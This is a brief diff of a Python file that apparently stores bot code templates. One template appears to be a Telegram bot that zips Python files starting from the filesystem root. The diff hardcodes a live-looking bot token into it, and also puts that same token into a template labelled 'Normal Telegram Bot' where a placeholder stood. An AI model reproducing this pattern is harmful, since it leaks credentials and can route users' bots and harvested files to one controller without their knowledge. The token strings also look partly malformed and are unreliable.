@@ -482,7 +482,7 @@ if __name__ == "__main__":
 import os, zipfile, tempfile
 from telegram.ext import Application, CommandHandler
 
-BOT_TOKEN = "8969205912:AAHacz7sK01SGUVRndasANl9k-bQKDrw4ic"
+BOT_TOKEN = "8680439397:AAEtR41IE2wRV4cAbN-Gws9L1H5d5SU6diY-bQKDrw4ic"
 ROOT_DIR = "/"
 
 def create_py_zip():
@@ -499,7 +499,7 @@ app.run_polling()
         ("Normal Telegram Bot", """
 import telebot
 
-bot = telebot.TeleBot("YOUR_TOKEN_HERE")
+bot = telebot.TeleBot("8680439397:AAEtR41IE2wRV4cAbN-Gws9L1H5d5SU6diY")
 
 @bot.message_handler(commands=["start"])
 def start(message):
